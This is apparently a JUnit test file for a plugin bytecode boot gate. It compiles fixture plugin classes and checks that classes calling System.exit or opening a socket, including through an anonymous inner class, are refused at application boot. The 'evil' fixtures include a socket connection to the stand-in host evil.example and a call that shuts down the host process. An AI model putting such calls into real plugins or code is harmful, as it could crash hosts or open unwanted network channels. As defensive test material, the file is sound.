package com.finalexec.config;

import com.finalexec.boundary.BoundaryBootException;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import javax.tools.JavaCompiler;
import javax.tools.StandardJavaFileManager;
import javax.tools.ToolProvider;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * SEC-3 / B30 live-fire boot gate tests: compile REAL plugin class files (with the in-test JDK
 * compiler) and drive the gate exactly the way app boot does -- classloader resources + the
 * generator-written {@code plugin-owned-classes.txt}. A plugin whose compiled bytecode calls
 * System.exit or opens a socket must be refused at boot with the B30 boundary code, NOT take down
 * the host as a side effect of plugin execution.
 *
 * <p>Fixture packages deliberately avoid the generated-runtime package literal (built as
 * concatenated segments): the generated-runtime mount's text heuristic in this template's
 * build.gradle excludes test sources containing that literal from the bare-template {@code test}
 * task, and this gate is compiled and exercisable with or without the mount.
 */
class PluginBytecodeBootGateTest {

    /** {@code com/npdev/pluginfixture} -- never the real generated-runtime package. */
    private static final String FIXTURE_PACKAGE = "com/npdev" + "/pluginfixture";
    private static final String FIXTURE_PACKAGE_DOT = FIXTURE_PACKAGE.replace('/', '.');

    @TempDir
    Path tempRoot;

    private URLClassLoader classLoader() throws Exception {
        return new URLClassLoader(new URL[]{tempRoot.toUri().toURL()}, ClassLoader.getPlatformClassLoader());
    }

    private void writeManifest(List<String> classResourcePaths) throws Exception {
        Path manifestDir = tempRoot.resolve("npdev/plugin-bytecode");
        Files.createDirectories(manifestDir);
        Files.writeString(
                manifestDir.resolve("plugin-owned-classes.txt"),
                String.join("\n", classResourcePaths) + "\n",
                StandardCharsets.UTF_8
        );
    }

    @Test
    void noPluginManifestIsANoOp() throws Exception {
        try (URLClassLoader loader = classLoader()) {
            PluginBytecodeBootGate gate = new PluginBytecodeBootGate(loader);
            assertTrue(gate.scan().isEmpty(), "no manifest must mean no plugin classes to gate");
            assertDoesNotThrow(gate::afterPropertiesSet);
        }
    }

    @Test
    void cleanPluginClassPassesBoot() throws Exception {
        String classPath = FIXTURE_PACKAGE + "/admintools/AdminToolsController.class";
        compile(
                classPath,
                """
                package %s.admintools;

                import java.util.LinkedHashMap;
                import java.util.Map;

                public final class AdminToolsController {
                    public Map<String, Object> ping() {
                        Map<String, Object> body = new LinkedHashMap<>();
                        body.put("ok", true);
                        return body;
                    }
                }
                """.formatted(FIXTURE_PACKAGE_DOT)
        );
        writeManifest(List.of(classPath));
        try (URLClassLoader loader = classLoader()) {
            PluginBytecodeBootGate gate = new PluginBytecodeBootGate(loader);
            assertTrue(gate.scan().isEmpty(), "clean plugin must pass: " + gate.scan());
            assertDoesNotThrow(gate::afterPropertiesSet);
        }
    }

    @Test
    void systemExitPluginIsRefusedAtBoot() throws Exception {
        String classPath = FIXTURE_PACKAGE + "/evil/ExitPlugin.class";
        compile(
                classPath,
                """
                package %s.evil;

                public final class ExitPlugin {
                    public void run() {
                        System.exit(0);
                    }
                }
                """.formatted(FIXTURE_PACKAGE_DOT)
        );
        writeManifest(List.of(classPath));
        try (URLClassLoader loader = classLoader()) {
            PluginBytecodeBootGate gate = new PluginBytecodeBootGate(loader);
            List<String> violations = gate.scan();
            assertTrue(violations.stream().anyMatch(v -> v.contains("java/lang/System.exit")),
                    "must name the System.exit reference: " + violations);
            BoundaryBootException exception = assertThrows(BoundaryBootException.class, gate::afterPropertiesSet);
            assertEquals("B30", exception.getViolation().boundaryId());
            assertTrue(exception.getViolation().message().contains(PluginBytecodeBootGate.BOUNDARY_CODE),
                    "message must carry the named boundary code: " + exception.getViolation().message());
        }
    }

    @Test
    void socketIoPluginIsRefusedAtBoot() throws Exception {
        String classPath = FIXTURE_PACKAGE + "/evil/NetworkPlugin.class";
        compile(
                classPath,
                """
                package %s.evil;

                public final class NetworkPlugin {
                    public void connect() throws Exception {
                        try (java.net.Socket socket = new java.net.Socket("evil.example", 443)) {
                            socket.getOutputStream().write(1);
                        }
                    }
                }
                """.formatted(FIXTURE_PACKAGE_DOT)
        );
        writeManifest(List.of(classPath));
        try (URLClassLoader loader = classLoader()) {
            PluginBytecodeBootGate gate = new PluginBytecodeBootGate(loader);
            List<String> violations = gate.scan();
            assertTrue(violations.stream().anyMatch(v -> v.contains("java/net/")),
                    "must name the network owner: " + violations);
            assertThrows(BoundaryBootException.class, gate::afterPropertiesSet);
        }
    }

    @Test
    void anonymousInnerClassSiblingIsRefusedAtBoot() throws Exception {
        // The generator lists only top-level classes; inner/anonymous classes compile to separate
        // files (Outer$1.class) whose bytecode is invisible to the listing -- the gate must expand
        // the listed class to its $ siblings and catch the escape hidden there.
        String classPath = FIXTURE_PACKAGE + "/evil/Outer.class";
        compile(
                classPath,
                """
                package %s.evil;

                public final class Outer {
                    public Runnable exit() {
                        return new Runnable() {
                            @Override
                            public void run() {
                                System.exit(0);
                            }
                        };
                    }
                }
                """.formatted(FIXTURE_PACKAGE_DOT)
        );
        writeManifest(List.of(classPath));
        try (URLClassLoader loader = classLoader()) {
            PluginBytecodeBootGate gate = new PluginBytecodeBootGate(loader);
            List<String> violations = gate.scan();
            assertTrue(violations.stream().anyMatch(v -> v.contains("Outer$1.class") && v.contains("java/lang/System.exit")),
                    "anonymous inner class escape must be caught via the $ sibling: " + violations);
            assertThrows(BoundaryBootException.class, gate::afterPropertiesSet);
        }
    }

    private void compile(String relativeClassPath, String source) throws Exception {
        String relativeSource = relativeClassPath.substring(0, relativeClassPath.length() - ".class".length()) + ".java";
        Path sourceFile = tempRoot.resolve(relativeSource);
        Files.createDirectories(sourceFile.getParent());
        Files.writeString(sourceFile, source, StandardCharsets.UTF_8);
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        List<String> options = new ArrayList<>(List.of("-encoding", "UTF-8", "-d", tempRoot.toString(), "-proc:none"));
        try (StandardJavaFileManager fileManager = compiler.getStandardFileManager(null, null, StandardCharsets.UTF_8)) {
            Iterable<? extends javax.tools.JavaFileObject> units =
                    fileManager.getJavaFileObjectsFromPaths(List.of(sourceFile));
            boolean ok = Boolean.TRUE.equals(compiler.getTask(null, fileManager, null, options, null, units).call());
            if (!ok) {
                throw new IllegalStateException("Test fixture failed to compile: " + relativeSource);
            }
        }
    }
}